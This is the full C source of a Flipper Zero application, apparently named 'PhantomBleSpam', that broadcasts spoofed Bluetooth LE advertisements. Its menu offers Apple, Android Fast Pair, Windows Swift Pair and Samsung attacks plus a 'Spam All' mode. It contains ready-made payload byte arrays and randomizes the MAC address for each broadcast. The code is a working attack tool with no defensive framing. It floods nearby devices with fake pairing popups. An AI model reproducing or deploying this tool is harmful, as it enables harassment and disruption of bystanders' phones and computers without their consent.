#include <furi.h>
#include <furi_hal.h>
#include <furi_hal_bt.h>
#include <furi_hal_random.h>
#include <gui/gui.h>
#include <input/input.h>
#include <notification/notification.h>
#include <notification/notification_messages.h>
#include <extra_beacon.h>

#define TAG "PhantomBleSpam"

typedef enum {
    AttackNone = 0,
    AttackApple,
    AttackAndroid,
    AttackWindows,
    AttackSamsung,
    AttackAll,
} AttackMode;

typedef enum {
    EventTypeTick,
    EventTypeKey,
} EventType;

typedef struct {
    EventType type;
    InputEvent input;
} AppEvent;

typedef struct {
    FuriMutex* mutex;
    AttackMode mode;
    uint32_t packet_count;
    uint8_t menu_index;
    uint8_t cycle_index;
    uint8_t payload_index;
} AppState;

static const char* menu_labels[] = {
    "Apple Device Popup",
    "Android Fast Pair",
    "Windows Swift Pair",
    "Samsung BLE Spam",
    "Spam All",
    "Stop",
};
#define MENU_ITEM_COUNT 6

/* Apple Continuity Nearby Action payloads */
static const uint8_t apple_payloads[][31] = {
    {0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xAA,
     0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07, 0x01, 0x20, 0x75, 0xAA,
     0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07, 0x0A, 0x20, 0x75, 0xAA,
     0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07, 0x0F, 0x20, 0x75, 0xAA,
     0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07, 0x05, 0x20, 0x75, 0xAA,
     0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07, 0x06, 0x20, 0x75, 0xAA,
     0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xAA,
     0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
};
#define APPLE_COUNT (sizeof(apple_payloads) / sizeof(apple_payloads[0]))

/* Google Fast Pair model IDs */
static const uint8_t fast_pair_models[][3] = {
    {0x00, 0x01, 0xF0}, /* Bose QC35 */
    {0x00, 0x00, 0x47}, /* AirPods */
    {0x00, 0xB7, 0x27}, /* Pixel Buds */
    {0x00, 0x06, 0x1C}, /* Pixel Buds Pro */
    {0x00, 0xD8, 0x46}, /* Sony WF-1000XM4 */
    {0x00, 0x60, 0x30}, /* JBL Flip 6 */
    {0x00, 0xE4, 0x17}, /* Nothing Ear 1 */
    {0x00, 0xAA, 0x48}, /* Samsung Galaxy Buds2 */
};
#define FAST_PAIR_COUNT (sizeof(fast_pair_models) / sizeof(fast_pair_models[0]))

/* Samsung payloads */
static const uint8_t samsung_payloads[][15] = {
    {0x0E, 0xFF, 0x75, 0x00, 0x42, 0x09, 0x81, 0x02, 0x14, 0x15, 0x03, 0x21, 0x01, 0x09, 0x00},
    {0x0E, 0xFF, 0x75, 0x00, 0x42, 0x09, 0x81, 0x02, 0x14, 0x15, 0x01, 0xA1, 0x03, 0x09, 0x00},
    {0x0E, 0xFF, 0x75, 0x00, 0x42, 0x09, 0x81, 0x02, 0x14, 0x15, 0x03, 0x31, 0x01, 0x09, 0x00},
    {0x0E, 0xFF, 0x75, 0x00, 0x42, 0x09, 0x81, 0x02, 0x14, 0x15, 0x03, 0x41, 0x01, 0x09, 0x00},
    {0x0E, 0xFF, 0x75, 0x00, 0x42, 0x09, 0x81, 0x02, 0x14, 0x15, 0x03, 0x51, 0x01, 0x09, 0x00},
    {0x0E, 0xFF, 0x75, 0x00, 0x42, 0x09, 0x81, 0x02, 0x14, 0x15, 0x01, 0xB1, 0x02, 0x09, 0x00},
};
#define SAMSUNG_COUNT (sizeof(samsung_payloads) / sizeof(samsung_payloads[0]))

/* Windows Swift Pair names */
static const char* swift_pair_names[] = {
    "Swift Pair Device",
    "Surface Earbuds",
    "Xbox Controller",
    "Surface Headphones",
    "Arc Mouse",
};
#define SWIFT_PAIR_COUNT (sizeof(swift_pair_names) / sizeof(swift_pair_names[0]))

static bool beacon_stop_safe(void) {
    if(furi_hal_bt_extra_beacon_is_active()) {
        return furi_hal_bt_extra_beacon_stop();
    }
    return true;
}

static bool beacon_send(const uint8_t* data, uint8_t data_len) {
    beacon_stop_safe();

    uint8_t mac[EXTRA_BEACON_MAC_ADDR_SIZE];
    furi_hal_random_fill_buf(mac, sizeof(mac));
    mac[0] |= 0xC0;

    GapExtraBeaconConfig config = {
        .min_adv_interval_ms = 20,
        .max_adv_interval_ms = 40,
        .adv_channel_map = GapAdvChannelMapAll,
        .adv_power_level = GapAdvPowerLevel_6dBm,
        .address_type = GapAddressTypeRandom,
    };
    memcpy(config.address, mac, EXTRA_BEACON_MAC_ADDR_SIZE);

    if(!furi_hal_bt_extra_beacon_set_config(&config)) return false;
    if(!furi_hal_bt_extra_beacon_set_data(data, data_len)) return false;
    if(!furi_hal_bt_extra_beacon_start()) return false;
    return true;
}

static uint8_t build_fast_pair(uint8_t* buf, uint8_t model_idx) {
    uint8_t i = 0;
    buf[i++] = 0x03;
    buf[i++] = 0x03;
    buf[i++] = 0x2C;
    buf[i++] = 0xFE;
    buf[i++] = 0x06;
    buf[i++] = 0x16;
    buf[i++] = 0x2C;
    buf[i++] = 0xFE;
    buf[i++] = fast_pair_models[model_idx][0];
    buf[i++] = fast_pair_models[model_idx][1];
    buf[i++] = fast_pair_models[model_idx][2];
    buf[i++] = 0x02;
    buf[i++] = 0x0A;
    buf[i++] = 0x00;
    return i;
}

static uint8_t build_swift_pair(uint8_t* buf, const char* name) {
    uint8_t i = 0;
    buf[i++] = 0x06;
    buf[i++] = 0xFF;
    buf[i++] = 0x06;
    buf[i++] = 0x00;
    buf[i++] = 0x03;
    buf[i++] = 0x01;
    buf[i++] = 0x80;
    uint8_t name_len = strlen(name);
    if(name_len > 20) name_len = 20;
    buf[i++] = name_len + 1;
    buf[i++] = 0x08;
    memcpy(&buf[i], name, name_len);
    i += name_len;
    return i;
}

static void send_packet(AppState* state, AttackMode mode) {
    uint8_t buf[EXTRA_BEACON_MAX_DATA_SIZE];
    uint8_t len = 0;

    switch(mode) {
    case AttackApple: {
        uint8_t idx = state->payload_index % APPLE_COUNT;
        beacon_send(apple_payloads[idx], 31);
        state->payload_index = (idx + 1) % APPLE_COUNT;
        break;
    }
    case AttackAndroid: {
        uint8_t idx = state->payload_index % FAST_PAIR_COUNT;
        len = build_fast_pair(buf, idx);
        beacon_send(buf, len);
        state->payload_index = (idx + 1) % FAST_PAIR_COUNT;
        break;
    }
    case AttackWindows: {
        uint8_t idx = state->payload_index % SWIFT_PAIR_COUNT;
        len = build_swift_pair(buf, swift_pair_names[idx]);
        beacon_send(buf, len);
        state->payload_index = (idx + 1) % SWIFT_PAIR_COUNT;
        break;
    }
    case AttackSamsung: {
        uint8_t idx = state->payload_index % SAMSUNG_COUNT;
        beacon_send(samsung_payloads[idx], 15);
        state->payload_index = (idx + 1) % SAMSUNG_COUNT;
        break;
    }
    default:
        return;
    }
    state->packet_count++;
}

static void send_next(AppState* state) {
    if(state->mode == AttackAll) {
        static const AttackMode cycle[] = {AttackApple, AttackAndroid, AttackWindows, AttackSamsung};
        send_packet(state, cycle[state->cycle_index % 4]);
        state->cycle_index = (state->cycle_index + 1) % 4;
    } else {
        send_packet(state, state->mode);
    }
}

static const char* mode_name(AttackMode mode) {
    switch(mode) {
    case AttackApple: return "Apple";
    case AttackAndroid: return "Android";
    case AttackWindows: return "Windows";
    case AttackSamsung: return "Samsung";
    case AttackAll: return "All";
    default: return "Idle";
    }
}

static void render_cb(Canvas* canvas, void* ctx) {
    AppState* state = ctx;
    furi_mutex_acquire(state->mutex, FuriWaitForever);
    canvas_clear(canvas);

    if(state->mode == AttackNone) {
        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str_aligned(canvas, 64, 2, AlignCenter, AlignTop, "[PHANTOM] BLE Spam");
        canvas_set_font(canvas, FontSecondary);
        for(uint8_t i = 0; i < MENU_ITEM_COUNT; i++) {
            uint8_t y = 16 + i * 9;
            if(i == state->menu_index) {
                canvas_draw_box(canvas, 0, y - 1, 128, 10);
                canvas_set_color(canvas, ColorWhite);
                canvas_draw_str(canvas, 4, y + 7, menu_labels[i]);
                canvas_set_color(canvas, ColorBlack);
            } else {
                canvas_draw_str(canvas, 4, y + 7, menu_labels[i]);
            }
        }
    } else {
        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str_aligned(canvas, 64, 2, AlignCenter, AlignTop, "[PHANTOM] BLE Spam");
        canvas_set_font(canvas, FontSecondary);
        canvas_draw_str(canvas, 4, 24, "Status: Broadcasting");
        char buf[40];
        snprintf(buf, sizeof(buf), "Attack: %s", mode_name(state->mode));
        canvas_draw_str(canvas, 4, 34, buf);
        snprintf(buf, sizeof(buf), "Packets: %lu", (unsigned long)state->packet_count);
        canvas_draw_str(canvas, 4, 44, buf);
        canvas_draw_str(canvas, 4, 58, "Press [BACK] to stop");
    }

    furi_mutex_release(state->mutex);
}

static void input_cb(InputEvent* input_event, void* ctx) {
    FuriMessageQueue* queue = ctx;
    AppEvent event = {.type = EventTypeKey, .input = *input_event};
    furi_message_queue_put(queue, &event, FuriWaitForever);
}

static void timer_cb(void* ctx) {
    FuriMessageQueue* queue = ctx;
    AppEvent event = {.type = EventTypeTick};
    furi_message_queue_put(queue, &event, 0);
}

int32_t phantom_ble_spam_app(void* p) {
    UNUSED(p);

    AppState* state = malloc(sizeof(AppState));
    memset(state, 0, sizeof(AppState));
    state->mutex = furi_mutex_alloc(FuriMutexTypeNormal);

    FuriMessageQueue* event_queue = furi_message_queue_alloc(8, sizeof(AppEvent));

    ViewPort* view_port = view_port_alloc();
    view_port_draw_callback_set(view_port, render_cb, state);
    view_port_input_callback_set(view_port, input_cb, event_queue);

    Gui* gui = furi_record_open(RECORD_GUI);
    gui_add_view_port(gui, view_port, GuiLayerFullscreen);

    NotificationApp* notifications = furi_record_open(RECORD_NOTIFICATION);
    notification_message_block(notifications, &sequence_display_backlight_enforce_on);

    FuriTimer* timer = furi_timer_alloc(timer_cb, FuriTimerTypePeriodic, event_queue);
    furi_timer_start(timer, furi_ms_to_ticks(150));

    AppEvent event;
    bool running = true;

    while(running) {
        FuriStatus status = furi_message_queue_get(event_queue, &event, 200);
        furi_mutex_acquire(state->mutex, FuriWaitForever);

        if(status == FuriStatusOk) {
            if(event.type == EventTypeKey && event.input.type == InputTypePress) {
                if(state->mode == AttackNone) {
                    switch(event.input.key) {
                    case InputKeyUp:
                        if(state->menu_index > 0) state->menu_index--;
                        break;
                    case InputKeyDown:
                        if(state->menu_index < MENU_ITEM_COUNT - 1) state->menu_index++;
                        break;
                    case InputKeyOk:
                        if(state->menu_index < 5) {
                            state->mode = (AttackMode)(state->menu_index + 1);
                            state->packet_count = 0;
                            state->payload_index = 0;
                            state->cycle_index = 0;
                        }
                        break;
                    case InputKeyBack:
                        running = false;
                        break;
                    default:
                        break;
                    }
                } else {
                    if(event.input.key == InputKeyBack) {
                        beacon_stop_safe();
                        state->mode = AttackNone;
                    }
                }
            } else if(event.type == EventTypeTick) {
                if(state->mode != AttackNone) {
                    send_next(state);
                }
            }
        }

        furi_mutex_release(state->mutex);
        view_port_update(view_port);
    }

    beacon_stop_safe();
    notification_message(notifications, &sequence_display_backlight_enforce_auto);

    furi_timer_free(timer);
    view_port_enabled_set(view_port, false);
    gui_remove_view_port(gui, view_port);
    furi_record_close(RECORD_GUI);
    furi_record_close(RECORD_NOTIFICATION);
    view_port_free(view_port);
    furi_message_queue_free(event_queue);
    furi_mutex_free(state->mutex);
    free(state);

    return 0;
}
